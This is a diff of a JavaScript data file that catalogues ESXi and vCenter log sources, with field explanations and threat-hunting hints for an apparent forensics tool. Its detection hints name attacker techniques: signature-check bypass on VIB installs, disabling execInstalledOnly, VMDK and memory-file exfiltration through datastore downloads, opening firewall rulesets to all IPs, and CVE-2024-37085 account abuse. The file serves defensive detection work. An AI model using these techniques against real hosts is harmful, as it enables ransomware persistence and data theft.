+{"n": "VMkernel warnings (non-VIB binary blocked)", "d": "/var/log/vmkwarning.log is the WARNING/ALERT subset of vmkernel.log. With execInstalledOnly enabled, the VMkernel refuses to run files that don't belong to an installed VIB and logs a warning, showing someone tried to run a binary they brought in. The exact message text differs between builds, so search for the execInstalledOnly / Elf keywords.", "f": "timestamp: Log time (UTC, with milliseconds)\ncpuN:worldID: CPU core and world ID of the process involved\nWARNING/ALERT: VMkernel warning level\nElf: VMkernel module that loads ELF executables\n/tmp/<file>: Path of the binary that was refused", "h": "A blocked execution followed shortly by a command disabling execInstalledOnly in shell.log is a highly suspicious sequence."},
 
-{"n":"Host Client / API login to ESXi","d":"/var/log/hostd.log.","f":"timestamp: Log time (UTC, with milliseconds)\ninfo: hostd log severity level\nhostd[pid]: Host agent (hostd) process and PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Component/subsystem that raised the event (hostd event manager)\nEvent <id>: VIM event code (2211 = successful login)\nUser <user>@<IP> logged in as <client>: Account, source IP, and client/user-agent used to log in (Host Client, API, PowerCLI...)","h":"Logging directly into the host (bypassing vCenter) when the host should be in lockdown mode."},
+{"n": "Host boot, shutdown and heartbeat", "d": "/var/log/vmksummary.log records host startup/shutdown events plus an hourly heartbeat line (uptime, number of running VMs, service resource usage). Use it to pinpoint unexpected reboots or a sudden drop in running VMs.", "f": "timestamp: Log time (UTC)\nbootstop: Host has booted / Host is rebooting: Host startup or reboot event\nheartbeat: up <uptime>: Time since the last boot\n<N> VMs: Number of VMs running at heartbeat time\n[[pid name memory]]: Memory used by the main service processes", "h": "The VM count dropping to 0 between two heartbeats outside a maintenance window matches the VM-kill phase before encryption; a reboot right after a VIB install may be loading a backdoor."},
 
-{"n":"Failed ESXi login (hostd)","d":"hostd recorded a failed login made directly to the host through the vSphere Client or API.","f":"timestamp: Log time (UTC, with milliseconds)\ninfo: hostd log severity level\nhostd[pid]: Host agent (hostd) process and PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Component that raised the event (hostd event manager)\nEvent <id>: VIM event code (2208 = failed login)\nCannot login <user>@<IP>: Account and source IP whose login was rejected","h":""},
+{"n": "Installing a VIB / update", "d": "/var/log/esxupdate.log records VIB and image profile install/update operations on the host.", "f": "timestamp: Log time (UTC)\nesxupdate: Name of the process logging VIB/image profile install and update operations\npid: PID of the esxupdate process (e.g. 2103400)\nuser: Account performing the install/update (e.g. root)\nINFO: Log severity level\nCommand = <cmd>: esxcli/esxupdate command executed (e.g. profile.install with --no-sig-check to bypass signature checking)", "h": "A VIB installed with --no-sig-check or CommunitySupported acceptance level on a production host."},
 
-{"n":"VMkernel log","d":"Storage, network, hardware.","f":"timestamp: Log time (UTC, with milliseconds)\ncpuN:worldID: CPU core handling the event and the world ID (kernel process/thread) that logged it\nWARNING: Severity of the VMkernel message (WARNING/ALERT/INFO...)\nNMP: VMkernel module/subsystem involved (e.g. Native Multipathing for storage paths)\nnmp_DeviceRequestFastDeviceProbe:237: Kernel source function and line number that logged the message, useful for KB lookups\nmessage: Detailed event content (e.g. storage device 'naa....' changed path state)","h":""},
+{"n": "HTTPS connections to the host (rhttpproxy)", "d": "/var/log/rhttpproxy.log is the log of ESXi's HTTP reverse proxy and records every new client connection to the host's web services (Host Client, SDK/API, vCenter). On ESXi 8.x most access logging moved to envoy-access.log.", "f": "timestamp: Log time (UTC, with milliseconds)\ninfo: Log severity\nrhttpproxy[pid]: Reverse proxy process and PID\nsub=Proxy Req <n>: Sequence number of the proxied request\n<TCP 'host IP : 443'>: ESXi host address and port\n<TCP 'client IP : port'>: Source IP and port of the connecting client", "h": "List the source IPs connecting directly to the host; IPs outside the management/vCenter range should be checked against logins in hostd.log."},
 
-{"n":"Installing a VIB / update","d":"/var/log/esxupdate.log.","f":"timestamp: Log time (UTC)\nesxupdate: Name of the process logging VIB/image profile install and update operations\npid: PID of the esxupdate process (e.g. 2103400)\nuser: Account performing the install/update (e.g. root)\nINFO: Log severity level\nCommand = <cmd>: esxcli/esxupdate command executed (e.g. profile.install with --no-sig-check to bypass signature checking)","h":"A VIB installed with --no-sig-check or CommunitySupported acceptance level on a production host."},
+{"n": "HTTP/API requests to the host (Envoy, ESXi 8.x)", "d": "Since ESXi 8.0, Envoy is the reverse proxy in front of the host's web services and records every HTTP/API request in /var/log/envoy-access.log. A GET to /folder/... downloads a file straight from a datastore (Datastore Browser, PowerCLI Copy-DatastoreItem, curl) and can be used to exfiltrate VMDKs without touching the guest OS.", "f": "timestamp: Request time (UTC)\nenvoy-access[pid]: Envoy process and PID\n<method> <path>: Request method and path (e.g. POST /sdk = API, GET /folder/... = datastore file download)\ndsName=: Datastore name\n<status>: HTTP status returned\nbytes sent: Bytes returned to the client, VMDKs are usually tens of GB\n<client IP:port>: Client source IP\n/var/run/vmware/proxy-hostd: Backend service that handled the request", "h": "Downloading -flat.vmdk, .vmsn or .vmem files (VM memory, contains credentials) from an IP that isn't the backup server signals exfiltration; correlate with the 'File download' line in hostd.log."},
+
+{"n": "Syslog messages dropped during forwarding", "d": "When vmsyslogd can't keep up (remote syslog unreachable, buffer full), the dropped messages are written to /var/log/vmsyslogd-dropped.log. It helps recover log lines missing from the SIEM and tell a genuine connectivity loss apart from deliberately cut forwarding.", "f": "timestamp: Time of the original message (UTC)\n<process>[pid]: Process that emitted the original message (e.g. shell, sshd, hostd)\nmessage: Verbatim text of the message that was not forwarded", "h": "When the SIEM shows a log gap from a host, read this file first; combine it with esxcli system syslog config get to see the current loghost setting."},
 
 {"n":"Local account locked","d":"/var/log/vobd.log.","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component that correlates user-level events\n[esx.audit.account.locked]: VOB audit event name — local account has been locked\nuser account 'root': Local account that was locked\nlocked for <N> seconds: Lockout duration in seconds (default 900s)\nafter <N> failed login attempts: Number of failed logins that triggered the lockout","h":""},
 
@@ -2426,10 +2380,6 @@ const EN_FIELDS = [
 {"n":"Local account created / removed","d":"Logs the creation or removal of a local OS account on ESXi/vCenter via API or UI (available since VI API 2.0). An important persistence indicator; related to ransomware campaigns (Storm-0506, Akira, Black Basta, etc.) exploiting CVE-2024-37085 to gain ESXi admin rights through the AD 'ESX Admins' group — in that case, an account/logon appears on the host even though it was never created there manually.","f":"fullFormattedMessage: description text containing the account name and action (e.g. \"Account 'backupsvc' created\")\nhost: the ESXi host or vCenter where the account was created/removed\nuserName: the account that performed the action (actor) – worth checking if empty or tied to the AD \"ESX Admins\" group (CVE-2024-37085)\ncreatedTime: time the account was created/removed\nchainId: ID linking to related events (e.g. a subsequent login using the new account)","h":""},
 
 {"n":"vCenter HTTPS reverse proxy log","d":"rhttpproxy is vCenter's single HTTPS entry point, routing requests to backend services (sdk, ui, websso, etc.). Useful for spotting scanning or exploitation attempts against admin endpoints before traces appear in more detailed application logs (vpxd.log, websso.log). Verbose logging must be enabled to log the source IP.","f":"Source IP, request path, HTTP status code","h":""},
-
-{"n":"Direct VMDK download via Datastore Browser (NFC)","d":"hostd.log logs a 'File download from path ... was initiated from ...' line when a client downloads a file directly from the datastore over the NFC protocol (Datastore Browser or another admin tool), bypassing the guest OS. This technique has been observed to exfiltrate an entire VMDK file (e.g. a Domain Controller's) without needing any access inside the guest.","f":"Datastore, VMPath, InitiatorTool, InitiatorIP","h":""},
-
-{"n":"ESXi firewall ruleset opened/closed via esxcli","d":"shell.log logs the esxcli network firewall ruleset set command when an admin enables the firewall ruleset for a service (e.g. sshServer) or opens allowed-all. Ransomware operators commonly enable this ruleset right before or alongside enabling SSH to maintain remote access.","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli network firewall ruleset set: Command that changes an ESXi firewall ruleset's configuration\n--ruleset-id=<name>: Firewall ruleset being changed (e.g. sshServer)\n--enabled=true --allowed-all=true: Enables the ruleset and allows all source IPs, fully opening the firewall for that service","h":""},
 
 {"n":"ESXi firewall configuration changed","d":"A VOB/audit event logged when the ESXi firewall configuration changes (ruleset enabled/disabled, allowed IPs edited, etc.), appearing in vobd.log/hostd.log alongside the matching esxcli command in shell.log. Note: this event name is confirmed via real-world logs and community security sources, not fully listed in official Broadcom documentation (the 'Managing ESXi Audit Records' section doesn't enumerate individual event IDs).","f":"timestamp: VOB log time (UTC)\n[UserLevelCorrelator]: vobd component correlating the event\n[esx.audit.net.firewall.config.changed]: VOB audit event name — ESXi firewall configuration has changed\nOperation '<enable/disable>': Action performed on the ruleset (enable/disable)\nrule set <name>: Firewall ruleset affected (e.g. sshServer)\nsucceeded: Result of the configuration change","h":""},
 
